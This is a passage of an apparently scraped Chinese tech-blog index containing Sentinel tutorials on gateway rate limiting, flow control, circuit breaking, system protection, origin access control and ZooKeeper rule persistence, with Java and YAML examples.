SpringApplication.run(GatewayApplication.class, args); }} 创建 application.yml 配置文件，由于这里指定了 context-path，因此在路由规则配置中需要使用 StripPrefix 参数将访问进来的 URL 中的 context-path 截取掉，否则 sentinel-gateway 微服务访问 sentinel-consumer 微服务时，会出现 404 错误 12345678910111213141516171819202122232425server: port: 8083 servlet: context-path: gatewayspring: application: name: sentinel-gateway cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT sentinel: transport: dashboard: 127.0.0.1:9000 gateway: routes: - id: sentinel-gateway-route uri: lb://sentinel-consumer predicates: - Path=/${server.servlet.context-path}/consumer/hello/** filters: - StripPrefix=1 若在 application.yml 配置文件里没有配置 context-path，那么路由规则配置可以使用以下的写法： 1234567891011server: port: 8083spring: cloud: gateway: routes: - id: sentinel-gateway-route uri: lb://sentinel-consumer predicates: - Path=/consumer/hello/** 3.5、测试代码 1）分别启动 sentinel-gateway、sentinel-consumer、sentinel-provider 应用 2）浏览器访问 http://127.0.0.1:8083/gateway/consumer/hello，若响应结果为 Hello Sentinel!，说明三个应用启动成功，同时在 Nacos 的控制台可以看到已经有三个服务注册了，如下图所示： 3）这里让 Sentinel 基于 Route 维度进行网关限流，浏览器访问 http://127.0.0.1:9000，打开 Sentinel 的控制台，在 sentinel-gateway 服务里动态添加网关流控规则，其中 API 名称就是 application.yml 配置文件里的路由 ID，如下图所示： 4）浏览器再次访问 http://127.0.0.1:8083/gateway/consumer/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 sentinel-gateway 微服务访问 sentinel-consumer 微服务时，Sentinel 的网关流控规则生效了 3.6、使用自定义 API 进行限流从 1.6.0 版本开始，Sentinel 提供了 Spring Cloud Gateway 的适配模块，可以提供两种资源维度的限流： route 维度：即在 Spring 配置文件中配置的路由条目，资源名为对应的 routeId 自定义 API 维度：用户可以利用 Sentinel 提供的 API 来自定义一些 API 分组 1）在 Sentinel 控制台里，删除所有与 sentinel-gateway 应用相关的网关流控规则 2）在 Sentinel 控制台的菜单栏里找到 sentinel-gatway -&gt; API 管理 -&gt; 新增 API 分组，由于上面在 application.yml 配置文件中指定了 context-path，因此表单里的” 匹配串” 为 /gateway/consumer/hello/**，” 匹配模式” 选择 前缀 3）在 Sentinel 控制台的菜单栏里找到 sentinel-gatway -&gt; 流控规则 -&gt; 新增网关流控规则，在表单里的 “API 类型” 选择 API 分组，”API 名称” 选择刚刚创建的 API 即可 4）浏览器访问 http://127.0.0.1:8083/gateway/consumer/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 sentinel-gateway 微服务访问 sentinel-consumer 微服务时，Sentinel 使用自定义 API 成功对网关进行限流了 参考博客 Sentinel 适配主流框架详解 Sentinel 官方文档中的网关限流 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"HarmonyOS 入门教程之一 HarmonyOS 简介",url:"/posts/658c60f7.html",text:'博客资料 HarmonyOS 官网 HarmonyOS 应用开发官网 HarmonyOS 设备开发官网 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"移动端"},{title:"Sentinel 入门教程 - 中级篇",url:"/posts/e3c83db6.html",text:'上篇 - Sentinel 入门教程（基础篇） Sentinel 入门教程 - 基础篇 前言1.0、版本说明本文针对 Sentinel 1.8.0 及以上版本编写，特别说明除外。由于 1.8.0 版本对熔断降级特性进行了全新的改进升级，建议使用最新版本以更好地利用熔断降级的能力。 1.1、Sentinel 的控制规则Sentinel 的所有规则都可以在内存态中动态地查询与修改，修改之后立即生效，同时 Sentinel 也提供了相关 API 供开发者来定制自己的规则策略。Sentinel 主要支持以下几种规则： 流量控制规则 熔断降级规则 系统保护规则 来源访问控制规则 动态规则扩展 Sentinel 流量控制实现2.0、流量控制概述流量控制（Flow Control），其原理是监控应用流量的 QPS 或者并发线程数等指标，当达到指定的阀值时对流量进行控制，以避免被瞬间的流量高峰冲垮，从而保障应用的高可用性。FlowSlot 会根据预设的规则，结合 NodeSelectorSlot、ClusterBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。限流的直接表现是在执行 Entry nodeA = SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，可以捕捉 BlockException 来自定义被限流之后的处理逻辑。 2.1、流量控制策略Sentinel 的流量控制策略主要有两种实现方式： 并发线程数：并发线程数限流用于保护业务线程数不被耗尽 QPS：当 QPS 超过某个阀值的时候，则采取措施进行流量控制 2.2、流量控制规则的属性流量控制规则（FlowRule）包含下面几个重要的属性： count：限流阀值 strategy：调用关系限流策略 resource：资源名，即流控规则的作用对象 grade：限流阀值类型（QPS 或者并发线程数） limitApp：流控针对的调用来源，若为 default 则不区分调用来源 controlBehavior：流量整形的控制效果（直接拒绝、Warm Up、匀速排队） 直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当 QPS 超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出 FlowException。这种方式适用于对系统处理能力确切已知的情况下，例如通过压测确定了系统的准确水位时。 Warm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热 / 冷启动方式，在系统长期处于低水位的情况下，当流量突然增加时，会直接把系统拉升到高水位，这可能会瞬间把系统拉跨。通过” 冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。 匀速排队（RuleConstant.CONTROL_BEHAVIOR_RATE_LIMITER）方式会严格控制请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法，例如阈值 QPS=2 时，每个 500ms 处理一个请求，假设当前有 10 个请求则需要排队处理 5 秒。 特别注意：同一个资源可以同时拥有多个流控规则，Sentinel 检查规则时会依次检查。 2.3、流量控制规则的设置流量控制规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 2.3.1、代码设置以下只给出流量控制的简单示例代码，若需要更详细的流量控制代码示例，可以点这里 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@RestControllerpublic class DegradeController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Flow"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：限流处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { // 被保护的资源 return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "系统繁忙，请稍候 ..."; } /** * 当前类的构造方法执行之后执行此方法 */ @PostConstruct public void initFlowRules() { // 创建存放流控规则的集合 List&lt;FlowRule&gt; rules = new ArrayList&lt;&gt;(); // 创建流控规则 FlowRule rule = new FlowRule(); // 定义资源，表示Sentinel会对哪个资源生效 rule.setResource(RESOURCE_NAME); // 定义流控规则的类型 rule.setGrade(RuleConstant.FLOW_GRADE_QPS); // 定义QPS每秒能通过的请求数 rule.setCount(2); // 将流控规则存放在集合中 rules.add(rule); // 加载流控规则 FlowRuleManager.loadRules(rules); }} 程序运行后，通过浏览器访问 http://127.0.0.1:8080/hello，然后快速多次刷新页面，当每秒的请求数大于 2 时，接口的请求结果为 系统繁忙，请稍候 ...，则说明上面设置的流控规则生效了。 2.3.2、注解属性说明 通过 @SentinelResource 注解的 blockHandler 属性制定具体的限流处理方法 实现处理方法，该方法的传参必须与资源点的传参一样，并且最后必须加上 BlockException 异常参数，同时返回类型也必须一样 2.3.3、Sentinel 控制台动态设置 Sentinel 熔断降级实现3.0、熔断降级概述除了流量控制以外，对调用链路中不稳定的资源进行熔断降级也是保障高可用的重要措施之一。一个服务常常会调用别的模块，可能是另外的一个远程服务、数据库，或者第三方 API 等。例如，支付的时候，可能需要远程调用银联提供的 API；查询某个商品的价格，可能需要进行数据库查询。然而，这个被依赖服务的稳定性是不能保证的。如果依赖的服务出现了不稳定的情况，请求的响应时间变长，那么调用服务的方法的响应时间也会变长，线程会产生堆积，最终可能耗尽业务自身的线程池，服务本身也变得不可用。 现代微服务架构都是分布式的，由非常多的服务组成。不同服务之间相互调用，组成复杂的调用链路。以上的问题在链路调用中会产生放大的效果。复杂链路上的某一环不稳定，就可能会层层级联，最终导致整个链路都不可用。因此需要对不稳定的弱依赖服务调用进行熔断降级，暂时切断不稳定调用，避免局部不稳定因素导致整体的雪崩。熔断降级作为保护自身的手段，通常在客户端（调用端）进行配置。熔断降级会在调用链路中某个资源出现不稳定状态时（例如调用超时或者异常比例升高），对这个资源的调用进行限制，让请求快速多次失败，避免影响到其他的资源而导致级联故障（服务雪崩）。当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断（默认行为是抛出 DegradeException）。 3.1、熔断降级策略 慢调用比例 (SLOW_REQUEST_RATIO）：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断。 异常比例 (ERROR_RATIO）：当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。 异常数 (ERROR_COUNT）：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。 特别注意：异常降级仅针对业务异常，对 Sentinel 限流降级本身的异常（BlockException）不生效。 3.2、熔断降级规则的属性熔断降级规则（DegradeRule）包含下面几个重要的属性： 特别注意：同一个资源可以同时拥有多个熔断降级规则。 3.3、熔断降级规则的设置熔断降级规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 3.3.1、代码设置下面将演示如何使用慢调用比例 (SLOW_REQUEST_RATIO）熔断降级规则，点击下载完整的案例代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768@RestControllerpublic class DegradeController { private static final String RESOURCE_NAME = "Degrade"; private Logger LOG = LoggerFactory.getLogger(DegradeController.class); /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：熔断降级处理的方法 */ @SentinelResource(value = RESOURCE_NAME, fallback = "exceptionHandler") @GetMapping("/hello") public String hello() { // 被保护的资源 try { Random random = new Random(); int millis = random.nextInt(10); LOG.info("sleep time: " + millis); // 随机休眠10毫秒以内，模拟接口慢调用 Thread.sleep(millis); } catch (InterruptedException e) { e.printStackTrace(); } return "hello"; } /** * 原方法被熔断降级的时候调用此方法 * * @return */ public String exceptionHandler() { LOG.error("fallback handler invoke"); return "系统繁忙，请稍候 ..."; } /** * 定义熔断降级规则 */ @PostConstruct public void initDegradeRule() { // 创建存放熔断降级规则的集合 List&lt;DegradeRule&gt; rules = new ArrayList&lt;&gt;(); // 创建熔断降级规则 DegradeRule rule = new DegradeRule(); // 定义资源名称 rule.setResource(RESOURCE_NAME); // 定义熔断降级规则的类型 rule.setGrade(RuleConstant.DEGRADE_GRADE_RT); // 定义降级熔断时间（单位 s） rule.setTimeWindow(5); // 定义慢调用临界RT（超出该值计为慢调用，单位 s） rule.setCount(0.005); // 定义熔断触发的最小请求数 rule.setMinRequestAmount(1); // 定义统计时长（单位为 ms） rule.setStatIntervalMs(1000); // 定义慢调用比例阈值 rule.setSlowRatioThreshold(0.5); // 将熔断降级规则添加到集合中 rules.add(rule); // 加载熔断降级规则 DegradeRuleManager.loadRules(rules); }} 上述定义的慢调用比例熔断降级规则为：调用临界 RT（超出该值计为慢调用）值为 0.005 秒，当 1000 毫秒内请求数量大于 1，且慢调用的比例大于阈值大于 0.5，则熔断降级 5 秒。 程序运行后，通过浏览器访问 http://127.0.0.1:8080/hello，然后快速多次刷新页面，若输出的日志信息类似下面的内容，则说明上面设置的熔断降级规则生效了。 123456789102020-01-18 22:15:45.705 INFO 61206 --- [nio-8080-exec-1] c.s.study.controller.DegradeController : sleep time: 82020-01-18 22:15:46.585 ERROR 61206 --- [nio-8080-exec-3] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:47.112 ERROR 61206 --- [nio-8080-exec-5] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:48.911 ERROR 61206 --- [nio-8080-exec-7] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:49.505 ERROR 61206 --- [nio-8080-exec-9] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:49.809 ERROR 61206 --- [nio-8080-exec-1] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:51.511 INFO 61206 --- [nio-8080-exec-3] c.s.study.controller.DegradeController : sleep time: 12020-01-18 22:15:51.834 INFO 61206 --- [nio-8080-exec-5] c.s.study.controller.DegradeController : sleep time: 32020-01-18 22:15:52.428 ERROR 61206 --- [nio-8080-exec-7] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:52.846 ERROR 61206 --- [nio-8080-exec-9] c.s.study.controller.DegradeController : fallback handler invoke 3.3.2、注解属性说明 3.3.3、Sentinel 控制台动态设置 Sentinel 系统自适应保护实现4.0、系统自适应保护概述在开始之前，先了解一下系统保护的目的： 保证系统不被拖垮 在系统稳定的前提下，保持系统的吞吐量 长期以来，系统保护的思路是根据硬指标，即系统的负载 (load1) 来做系统过载保护。当系统负载高于某个阈值，就禁止或者减少流量的进入；当 load 开始好转，则恢复流量的进入。这个思路给我们带来了不可避免的两个问题： load 是一个 “结果”，如果根据 load 的情况来调节流量的通过率，那么就始终有延迟性。也就意味着通过率的任何调整，都会过一段时间才能看到效果。当前通过率是使 load 恶化的一个动作，那么也至少要过 1 秒之后才能观测到；同理，如果当前通过率调整是让 load 好转的一个动作，也需要 1 秒之后才能继续调整，这样就浪费了系统的处理能力。所以我们看到的曲线，总是会有抖动。 恢复慢。想象一下这样的一个场景（真实），出现了这样一个问题，下游应用不可靠，导致应用 RT 很高，从而 load 到了一个很高的点。过了一段时间之后下游应用恢复了，应用 RT 也相应减少。这个时候，其实应该大幅度增大流量的通过率；但是由于这个时候 load 仍然很高，通过率的恢复仍然不高。 TCP BBR 的思想给了我们一个很大的启发。我们应该根据系统能够处理的请求，和允许进来的请求，来做平衡，而不是根据一个间接的指标（系统 load）来做限流。最终我们追求的目标是在系统不被拖垮的情况下，提高系统的吞吐率，而不是 load 一定要到低于某个阈值。如果我们还是按照固有的思维，超过特定的 load 就禁止流量进入，系统 load 恢复就放开流量，这样做的结果是无论我们怎么调参数，调比例，都是按照果来调节因，都无法取得良好的效果。Sentinel 在系统自适应保护的做法是，用 load1 作为启动自适应保护的因子，而允许通过的流量由处理请求的能力，即请求的响应时间以及当前系统正在处理的请求速率来决定。 4.1、系统自适应保护策略系统保护规则是从应用级别的入口流量进行控制，从单台机器的 Load、CPU 使用率、平均 RT、入口 QPS 和并发线程数等几个维度监控应用指标，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。系统保护规则是应用整体维度的，而不是资源维度的，并且仅对入口流量生效。入口流量指的是进入应用的流量（EntryType.IN），比如 Web 服务或 Dubbo 服务端接收的请求，都属于入口流量。 系统规则支持以策略： Load 自适应（仅对 Linux/Unix-like 机器生效）：系统的 load1 作为启发指标，进行自适应系统保护。当系统 load1 超过设定的启发值，且系统当前的并发线程数超过估算的系统容量时才会触发系统保护（BBR 阶段）。系统容量由系统的 maxQps * minRt 估算得出。设定参考值一般是 CPU cores * 2.5。 CPU Usage（1.5.0+ 版本）：当系统 CPU 使用率超过阈值即触发系统保护（取值范围 0.0-1.0），比较灵敏。 平均 RT：当单台机器上所有入口流量的平均 RT 达到阈值即触发系统保护，单位是毫秒。 并发线程数：当单台机器上所有入口流量的并发线程数达到阈值即触发系统保护。 入口 QPS：当单台机器上所有入口流量的 QPS 达到阈值即触发系统保护。 4.2、系统自适应保护规则的属性 特别注意：系统自适应保护规则只针对入口资源（EntryType.IN）有效 4.3、系统自适应保护规则的设置系统自适应保护规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 4.3.1、代码设置以下演示的是如何使用 入口 QPS 系统自适应保护规则，点击下载完整的案例代码。 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class SystemProtectController { /** * 定义资源 * EntryType.IN 表示入口资源 * * @return */ @SentinelResource(entryType = EntryType.IN) @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * 定义系统自适应保护规则 */ @PostConstruct public void initSystemRule() { // 创建存放系统自适应保护规则的集合 List&lt;SystemRule&gt; rules = new ArrayList&lt;&gt;(); // 创建系统自适应保护规则 SystemRule rule = new SystemRule(); // 定义入口资源的QPS（每秒允许的最大请求数） rule.setQps(2); // 添加系统自适应保护规则到集合中 rules.add(rule); // 加载系统自适应保护规则 SystemRuleManager.loadRules(rules); }} 程序运行后，当 /hello 接口每秒请求的次数大于 2，则会触发 Sentinel 的系统自适应保护规则，同时会返回 Blocked by Sentinel (flow limiting) 字符串给客户端。 4.3.2、Sentinel 控制台动态设置 Sentinel 来源访问控制实现5.0、来源访问控制概述很多时候需要根据调用来源来判断该次请求是否允许放行，这时候可以使用 Sentinel 的来源访问控制（授权控制、黑白名单控制）的功能。来源访问控制根据资源的请求来源（origin）限制资源是否通过，若配置白名单则只有请求来源位于白名单内时才可通过；若配置黑名单则请求来源位于黑名单时不通过，其余的请求通过。调用方的信息通过 ContextUtil.enter(resourceName, origin) 方法中的 origin 参数传入。特别注意，白名单和黑名单不能同时使用。 5.1、来源访问控制规则的属性来源访问控制规则（AuthorityRule）非常简单，主要有以下配置项： resource：资源名，即流控规则的作用对象。 limitApp：对应的黑名单 / 白名单，不同 origin 用 , 分隔，例如 appA,appB。 strategy：限制模式，AUTHORITY_WHITE 为白名单模式，AUTHORITY_BLACK 为黑名单模式，默认为白名单模式。 5.2、来源访问控制规则的设置来源访问控制规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 5.2.1、代码设置下面将演示如何使用白名单来源访问控制规则，点击下载完整的案例代码。 1234567891011/** * 自定义来源解析器 */ @Component public class RequestOriginParserDefinition implements RequestOriginParser { @Override public String parseOrigin(HttpServletRequest httpServletRequest) { return httpServletRequest.getRemoteAddr(); } } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@RestControllerpublic class OriginControlController { private static final String RESOURCE_NAME = "Origin"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：被限制访问时处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * 原方法被限制访问的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { return "系统繁忙，请稍候 ..."; } /** * 定义来源访问控制规则（黑名单） */ @PostConstruct public void initBlackRule() { // 创建存放规则的集合 List&lt;AuthorityRule&gt; rules = new ArrayList&lt;&gt;(); // 创建来源访问控制规则 AuthorityRule rule = new AuthorityRule(); // 定义资源名称 rule.setResource(RESOURCE_NAME); // 定义限制模式 rule.setStrategy(RuleConstant.AUTHORITY_BLACK); // 定义请求来源 rule.setLimitApp("127.0.0.1"); // 将规则保存到集合中 rules.add(rule); // 加载规则 AuthorityRuleManager.loadRules(rules); }} 程序运行后，通过浏览器访问 http://127.0.0.1:8080/hello，若响应结果为 系统繁忙，请稍候 ...，则说明上面设置的黑名单来源控制规则生效了。 5.2.2、Sentinel 控制台动态设置 Sentinel 动态规则扩展（持久化规则）Sentinel 的理念是开发者只需要关注资源的定义，当资源定义成功后可以动态增加各种流控降级规则。Sentinel 提供以下几种方式设置规则： 通过 API 直接设置 (loadRules) 通过 DataSource 适配不同数据源修改 手动通过 API 设置比较直观，可以通过以下几个 API 设置不同的规则： 1234FlowRuleManager.loadRules(List&lt;FlowRule&gt; rules); // 设置流控规则DegradeRuleManager.loadRules(List&lt;DegradeRule&gt; rules); // 设置熔断降级规则SystemRuleManager.loadRules(List&lt;SystemRule&gt; rules); // 设置系统自适应保护规则AuthorityRuleManager.loadRules(List&lt;AuthorityRule&gt; rules); // 设置来源访问控制规则 6.0、DataSource 扩展不管是通过 Java 代码还是通过 Sentinel 控制台的方式设置流控降级规则，都属于手动方式，不够灵活。这种方式一般仅用于测试和演示，生产环境一般通过动态规则源的方式来动态管理流控降级规则。上述 loadRules() 方法只接受内存态的规则对象，但更多时候规则存储在文件、数据库或者配置中心当中。Sentinel 的 DataSource 接口提供了对接任意数据源的能力。Sentinel 官方推荐通过控制台设置规则后，将规则推送到统一的规则中心，客户端则实现 ReadableDataSource 接口监听规则中心来实时获取规则配置的变更，流程图如下： DataSource 扩展常见的实现方式有: 拉模式：客户端主动向某个规则管理中心定期轮询拉取规则，这个规则中心可以是 RDBMS、文件，甚至是 VCS 等。这样做的方式是简单，缺点是无法及时获取变更 推模式：规则中心统一推送，客户端通过注册监听器的方式时刻监听变化，比如使用 Nacos、Zookeeper 等配置中心，这种方式有更好的实时性和一致性保证 Sentinel 目前支持以下数据源扩展： Pull-based（拉模式）: 动态文件数据源、Consul、Eureka Push-based（推模式）: ZooKeeper、Apollo、Nacos, etcd、Redis 6.1、使用 ZooKeeper 规则配置（推模式）下面将演示如何使用 ZooKeeper 存放 Sentinel 的流控规则配置数据，使用的是 推模式，各组件的版本如下，点击下载完整的案例代码。 Sentinel 1.8.0 ZooKeeper Server 3.5.5 Spring Boot 2.1.18.RELEASE Sentinel Datasource Zookeeper 1.8.0 Spring Cloud Starter Sentinel 2.1.3.RELEASE 6.1.1、代码示例引入 Maven 依赖，添加 sentinel-datasource-zookeeper 依赖 1234567891011121314151617181920212223242526272829303132333435&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt; &lt;sentinel-datasource-zookeeper.version&gt;1.8.0&lt;/sentinel-datasource-zookeeper.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-zookeeper&lt;/artifactId&gt; &lt;version&gt;${sentinel-datasource-zookeeper.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Sentinel 的 配置类，让 Sentinel 使用 ZooKeeper 作为规则配置数据源 12345678910111213141516171819202122232425@Configurationpublic class SentinelZookeeperConfig { public static final String ZOOKEEPER_ADDRESS = "127.0.0.1:2181"; public static final String ZOOKEEPER_PATH = "/Sentinel/FlowRules"; /** * Sentinel从Zookeeper加载规则配置数据 */ @PostConstruct public void init() { // 参数一：Zookeeper的地址 // 参数二：Zookeeper中数据的路径 // 参数三：Zookeeper中数据的解析器 ReadableDataSource&lt;String, List&lt;FlowRule&gt;&gt; flowRuleDataSource = new ZookeeperDataSource&lt;&gt;( ZOOKEEPER_ADDRESS, ZOOKEEPER_PATH, source -&gt; JSON.parseObject(source, new TypeReference&lt;List&lt;FlowRule&gt;&gt;() { })); // 加载流控规则 FlowRuleManager.register2Property(flowRuleDataSource.getProperty()); }} 创建 Controller 测试类 123456789101112131415161718192021222324252627282930313233@RestControllerpublic class HelloController { private final static Logger LOG = LoggerFactory.getLogger(HelloController.class); /** * 资源名称 */ public static final String RESOURCE_NAME = "Hello"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：限流处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { LOG.info("系统繁忙，请稍候 ..."); return "系统繁忙，请稍候 ..."; }} 创建主启动类 1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 创建 application.yml 配置文件，其中 sentinel.transport.dashboard 为非必要配置项；若不需要通过 Sentinel 控制台监控应用，这里可以不配置 sentinel.transport.dashboard，无论是否配置都不会影响应用加载和动态感知 ZooKeeper Server 中的规则配置数据 12345678910server: port: 8080spring: application: name: sentinel-zookeeper-demo cloud: sentinel: transport: dashboard: 127.0.0.1:9000 # 非必要配置项 创建 ZooKeeper 的数据测试类，作用是插入规则配置数据到 ZooKeeper 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@RunWith(SpringRunner.class)@SpringBootTestpublic class ZookeeperConfigSender { private static final int RETRY_TIMES = 3; private static final int SLEEP_TIME = 1000; @Test public void sendData() throws Exception { final String remoteAddress = "127.0.0.1:2181"; final String groupId = "Sentinel"; final String dataId = "FlowRules"; final String rule = "[\\n" + " {\\n" + " \\"resource\\": \\"Hello\\",\\n" + " \\"controlBehavior\\": 0,\\n" + " \\"count\\": 2.0,\\n" + " \\"grade\\": 1,\\n" + " \\"limitApp\\": \\"default\\",\\n" + " \\"strategy\\": 0\\n" + " }\\n" + "]"; CuratorFramework zkClient = CuratorFrameworkFactory.newClient(remoteAddress, new ExponentialBackoffRetry(SLEEP_TIME, RETRY_TIMES)); zkClient.start(); String path = getPath(groupId, dataId); Stat stat = zkClient.checkExists().forPath(path); if (stat == null) { zkClient.create().creatingParentContainersIfNeeded().withMode(CreateMode.PERSISTENT).forPath(path, null); } zkClient.setData().forPath(path, rule.getBytes()); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } zkClient.close(); } private static String getPath(String groupId, String dataId) { String path = ""; if (groupId.startsWith("/")) { path += groupId; } else { path += "/" + groupId; } if (dataId.startsWith("/")) { path += dataId; } else { path += "/" + dataId; } return path; }} 6.1.2、测试代码 1）启动 ZooKeeper Server 2）启动 sentinel-zookeeper-demo 应用，若控制台输出如下日志信息，则说明应用已经成功连接上 ZooKeeper 服务器 1234[localhost:2181)] org.apache.zookeeper.ClientCnxn : Opening socket connection to server localhost/127.0.0.1:2181. Will not attempt to authenticate using SASL (unknown error)[localhost:2181)] org.apache.zookeeper.ClientCnxn : Socket connection established to localhost/127.0.0.1:2181, initiating session[localhost:2181)] org.apache.zookeeper.ClientCnxn : Session establishment complete on server localhost/127.0.0.1:2181, sessionid = 0x10000447be50007, negotiated timeout = 40000[ain-EventThread] o.a.c.f.state.ConnectionStateManager : State change: CONNECTED 3）浏览器访问 http://127.0.0.1:8080/hello，快速多次刷新页面，可以发现响应结果会一直返回 Hello Sentinel! 字符串 4）通过 Junit 执行 ZookeeperConfigSender.sendData() 方法，将规则配置数据插入到 ZooKeeper Server 5）通过命令行登录进 ZooKeeper Server 后，执行以下操作，可以观察到 ZooKeeper Server 中有对应的规则配置数据成功插入了 1234567891011[zk: localhost:2181(CONNECTED) 15] get /Sentinel/FlowRules[ { "resource": "Hello", "controlBehavior": 0, "count": 2.0, "grade": 1, "limitApp": "default", "strategy": 0 }] 6）浏览器再次快速多次访问 http://127.0.0.1:8080/hello，若响应结果为 系统繁忙，请稍候 ...，则说明 Sentinel 成功加载到 ZooKeeper Server 里的规则配置数据，而且是基于 推模式，默认支持监听规则配置的变更 